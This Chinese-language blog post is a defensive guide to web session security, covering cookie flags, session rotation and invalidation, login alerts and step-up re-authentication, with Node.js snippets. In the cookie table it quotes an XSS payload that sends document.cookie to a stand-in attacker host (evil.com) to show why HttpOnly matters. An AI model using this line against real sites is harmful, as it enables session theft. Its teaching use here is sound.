---
layout: post
title: 权限体系之-13-passport 登录安全之提升 session 会话安全（HttpOnly/Secure/SameSite + 登录后失效旧会话）
date: 2025-11-20 14:12:33 +0800
categories: [plateform]
tags: [plateform, sh]
published: true
---


# 会话安全

下面把“会话安全”这一块拆得很细，全部围绕真实攻击场景来讲，每一条都告诉你**攻击者怎么偷/怎么用**，以及**具体怎么彻底堵死**。

### 1. Cookie 属性三件套：HttpOnly + Secure + SameSite（重点中的重点）

| 属性          | 写法（Node.js/Express 示例）                              | 能防什么攻击                                                                 | 如果不设会怎样（真实案例） |
|---------------|----------------------------------------------------------|-----------------------------------------------------------------------------|----------------------------|
| **Secure**    | `cookie: { secure: true }` <br>或手动 `Set-Cookie: sessionid=xxx; Secure` | 防止在 HTTP（明文）下泄露 Cookie                                     | 凡是没强制 HTTPS 的网站（包括很多内网系统），用 Wireshark 或公司 WiFi 一抓就拿到所有人的 session |
| **HttpOnly**  | `cookie: { httpOnly: true }`                             | 彻底禁止 JavaScript 读取/修改 Cookie（`document.cookie` 失效）         | 任何 XSS（哪怕是反射型）都能直接 `fetch('https://evil.com?cookie='+document.cookie)` 偷走登录态 |
| **SameSite**  | `cookie: { sameSite: 'strict' }`（推荐）<br>或 `'lax'`   | 防 CSRF + 防第三方网站跨站带走 Cookie                                | 2020 年之前 90% 网站没设 SameSite，CSRF 攻击泛滥；Chrome 现在默认 Lax，但 Strict 更安全 |

**推荐最终写法（2025 年最严格标准）**：
```http
Set-Cookie: sessionid=xxxxxx; Path=/; Domain=example.com; 
            Secure; HttpOnly; SameSite=Strict; Max-Age=604800
```
- 生产环境强制 `SameSite=Strict`（登录后跳转回来也不会带 Cookie？用一次性临时 token 解决，代价极小）
- 如果你有 OAuth 回调、第三方支付回调等跨站场景，实在不行降为 `Lax`，但绝不能留空或 `None`

### 2. Session ID 本身的强度与轮换

| 项目                  | 推荐做法                                                                 | 为什么 |
|-----------------------|--------------------------------------------------------------------------|--------|
| 熵（随机性）          | 至少 128 bit 真实随机（Node 用 `crypto.randomBytes(48).toString('base64url')`） | 防止暴力猜测 |
| 登录后立即更换 Session ID | 用户每次成功登录（包括记住我）都生成全新 session ID，旧的立即销毁          | 防止 Session Fixation（会话固定攻击） |
| 改密码/退出/添加2FA 时强制更换 | 高危操作后所有已有会话失效，只保留当前会话                              | 防止密码泄露后黑客继续用旧会话 |
| 定期轮换（可选）      | 每 24 小时或 7 天自动刷新一次 session ID（用户无感知）                   | 减少长期持有风险 |

真实案例：2018 年某大型论坛就是因为不更换 session ID，黑客拿到管理员密码后，用之前半年前的 session 继续登录。

### 3. 登录后自动失效旧会话（非常关键的一招）

**场景**：用户在 A 设备登录 → 密码泄露 → 黑客拿密码在 B 设备登录 → 用户在 A 设备仍保持登录状态 → 黑客为所欲为。

**正确做法**（几乎所有大厂都在做）：
- 数据库/Redis 的 session 表里加一列 `user_id` + `last_replaced_at`（或 `generation` 版本号）
- 用户每次成功登录：
  1. 把该用户所有旧 session 标记为失效（或直接删除）
  2. 只保留当前这次登录的 session
- 前端提供“一键退出所有其他设备”功能（本质就是再触发一次上面逻辑）

代码示例（伪代码）：
```js
// 登录成功后
await db.session.deleteMany({ where: { userId: user.id } });
const newSession = await createSession(user.id);  // 只有这一个有效
```

### 4. 关键操作强制重新验证（Re-authentication）

| 操作                        | 必须重新验证什么                     | 典型实现方式 |
|-----------------------------|-------------------------------------|--------------|
| 修改密码                    | 旧密码 + 2FA                        | 临时弹窗要求输入 |
| 修改/解绑邮箱、手机号        | 密码 + 2FA                          | 同上 |
| 添加/删除 2FA               | 密码 + 现有 2FA                     | 同上 |
| 大额提现、转账、修改支付方式 | 密码 + 2FA（有时还要短信独立验证码） | 同上 |
| 开启“记住我”长效登录       | 建议也强制 2FA                      | - |

这样即使黑客偷到当前 session，也无法完成高危操作。

### 5. 显示最近登录记录 + 手动退出其他会话

用户个人中心展示：
```
最近登录记录
2025-11-27 10:30  中国北京   Chrome 129   (当前设备)
2025-11-26 23:15  美国洛杉矶   Safari       [退出此会话]
2025-11-25 08:12  新加坡       Unknown      [退出此会话]
[退出所有其他会话] 按钮
```

实现上就是把每次登录的 IP、User-Agent、时间、session_id 存一张 login_history 表，配合上面的“失效旧会话”功能即可。

### 总结：一个最硬核的会话安全配置清单（直接抄走）

```js
// 1. Cookie 设置（一次设置终身受用）
res.cookie('sessionid', sessionId, {
  httpOnly: true,
  secure: true,                  // 强制 HTTPS
  sameSite: 'strict',            // 或者至少 'lax'
  domain: '.example.com',
  path: '/',
  maxAge: 30 * 24 * 60 * 60 * 1000   // 30 天，配合“记住我”
});

// 2. 登录成功后立即
await Session.destroy({ where: { userId } });  // 干掉该用户所有旧会话
await Session.create({ userId, sessionId, ip, ua, ... });

// 3. 改密码、添加2FA 等高危接口开头强制校验当前 session 是否有效 + 要求重新输入密码/2FA

// 4. 提供 API：POST /auth/sessions/terminate_others
// 5. 提供 API：POST /auth/sessions/terminate_all（退出登录时调用）
```

把上面这几条全部落地，你的会话安全水平直接追平 GitHub、Apple、Stripe 等顶级玩家，普通黑客基本无从下手。


# 详细展开介绍 登录通知 + 关键操作重新认证

下面把「登录通知」和「关键操作重新认证」这两招拆得极细，直接可以拿去写需求文档和代码。

### 一、登录通知（New Login Notification）
目标：让用户在 5 分钟内就知道有人用他的账号在别的地方登录了，99% 的账户被盗都是因为用户完全没感知。

#### 1. 什么时候必须发通知（2025 年主流标准）
| 触发场景                          | 是否必须发通知 | 推荐标题（用户能立刻看懂）                  |
|----------------------------------|----------------|--------------------------------------------|
| 首次在新设备/新浏览器登录         | 必须           | 【警报】您的账号在新设备登录                 |
| 首次在新国家/新省份登录           | 必须           | 【警报】您的账号在美国加州登录               |
| 首次用新操作系统（iOS → Android）| 必须           | 【警报】您的账号在 Android 手机登录         |
| 距离上次登录 ≥ 30 天后再次登录    | 必须           | 【警报】您的账号 30 天后首次登录            |
| 同一账号 10 分钟内出现 ≥ 3 个不同城市 | 必须 + 强制锁号 | 【紧急】检测到异地多点登录，已暂时冻结账号   |
| 成功登录后立即改密码/关闭 2FA     | 必须（双发）   | 【紧急】有人刚刚修改了您的密码               |

#### 2. 通知内容必须包含的 6 个关键信息（缺一个都不行）
```
【XX 平台】检测到新设备登录
时间：2025-11-27 10:25:18（北京时间）
地点：美国 加利福尼亚州 圣何塞
IP：35.192.x.x
设备：Chrome 129（Windows 11）

如果不是您本人操作，请立即：
1. 点此链接重置密码并退出所有设备：https://example.com/reset-emergency?token=xxx（30 分钟内有效）
2. 检查是否开启了双重验证

这是一封系统邮件，请勿回复。
```

#### 3. 通知渠道优先级（多渠道并发）
1. 推送（iOS/Android App 推送）—— 到达率最高，90% 用户 1 分钟内看到
2. 邮箱（立即发送）
3. 短信（建议仅在「新国家登录」或「高风险」时发，成本高但震慑力最强）
4. 站内信（保底）

#### 4. 实现细节（后端伪代码）
```js
async function shouldSendLoginAlert(userId, ip, ua, geo) {
  const lastLogin = await LoginHistory.lastSuccessful(userId);
  
  const conditions = [
    !lastLogin,
    geo.country !== lastLogin.geo.country,
    geo.city_distance_km > 500,
    ua.fingerprint !== lastLogin.ua_fingerprint,  // 用 github.com/fingerprintjs
    daysSinceLastLogin > 30
  ];

  return conditions.some(Boolean);
}

// 登录成功后
if (await shouldSendLoginAlert(user.id, ip, ua, geo)) {
  await Promise.all([
    sendPush(user.id, alertTemplate),
    sendEmail(user.email, alertTemplate),
    geo.countryChanged && sendSMS(user.phone, shortAlert)
  ]);
}
```

### 二、关键操作重新认证（Re-authentication / Step-up Authentication）
目标：即使黑客偷到当前有效的 session，也无法完成高价值操作。

#### 1. 必须强制重新认证的操作清单（2025 年最严格标准）
| 操作类型                         | 必须重新验证的内容                         | 有效期（多久不再重复弹） | 典型实现方式 |
|----------------------------------|--------------------------------------------|--------------------------|--------------|
| 修改登录密码                     | 旧密码 + 2FA                               | 当前会话全程有效         | 弹窗输入       |
| 更换/解绑邮箱                    | 密码 + 2FA                                 | 30 分钟                  | 弹窗         |
| 更换/解绑手机号                  | 密码 + 2FA + 新手机号短信验证码            | 30 分钟                  | 弹窗         |
| 关闭/移除 2FA                    | 密码 + 现有 2FA                            | 当前会话全程有效         | 弹窗         |
| 新增支付方式（银行卡、信用卡）   | 密码 + 2FA + 支付机构额外验证              | 30 分钟                  | 弹窗 + 跳转    |
| 大额提现/转账（≥ 5000 元）       | 密码 + 2FA + 独立短信/邮件动态码           | 每次都弹                 | 弹窗         |
| 开启/修改“记住我”长效登录        | 强制 2FA（哪怕之前没开）                   | -                        | 登录页勾选时弹 |
| 下载全量用户数据/隐私报告        | 密码 + 2FA                                 | 30 分钟                  | 弹窗         |
| 导出私钥/助记词（加密货币钱包）  | 密码 + 2FA + 手动二次确认勾选              | 每次都弹                 | 多步弹窗       |

#### 2. 推荐的重新认证技术实现方式（前后端全套）
方案 A：短时 ReAuth Token（最常用，推荐）
```js
// 用户输入密码+2FA 成功后
const reauthToken = jwt.sign(
  { userId: user.id, purpose: 'sensitive_op' },
  REAUTH_SECRET,
  { expiresIn: '30m' }
);
setCookie('reauth', reauthToken, { httpOnly: true, secure: true });
```

高危接口开头校验：
```js
if (!req.cookies.reauth || !verifyReauthToken(req.cookies.reauth)) {
  return res.status(401).json({ needReAuth: true });
}
```

方案 B：Session 中加字段（适合 Redis）
```js
// 重新认证成功后
session.reauthAt = Date.now();
session.reauthLevel = 'full';  // full / basic / none
```

#### 3. 前端用户体验最佳实践
- 永远使用模态弹窗，不要跳转新页面（防止黑客用 iframe 套）
- 记住「本次会话 30 分钟内不再弹」（用 reauth cookie 控制）
- 提供「不是你？立即冻结账号」红色大按钮，直达一键改密+退出所有设备
- 失败 3 次后直接锁号 30 分钟

#### 4. 真实案例对比
| 公司         | 是否做重新认证 | 后果 |
|--------------|----------------|------|
| 某东、淘宝   | 全部高危操作都弹 | 几乎听不到“账号被盗后钱没了” |
| 2021 年某团购网站 | 只改密码时弹 | 黑客偷 session 后直接解绑手机号、提现几万 |
| Twitter 2020之前 | 几乎不弹     | 大量名人账号被盗转发诈骗 |

把上面这两块（登录通知 + 关键操作重新认证）彻底落地后，用户即使密码被键盘记录器偷了、钓鱼站被骗、数据库被脱库，黑客也几乎拿不到钱、拿不到核心权限。

国内几乎所有头部互联网公司（阿里、腾讯、字节、美的、银行）现在都是这个强度。

成本很低（主要就是几封邮件和一个弹窗），但安全提升是指数级的。

* any list
{:toc}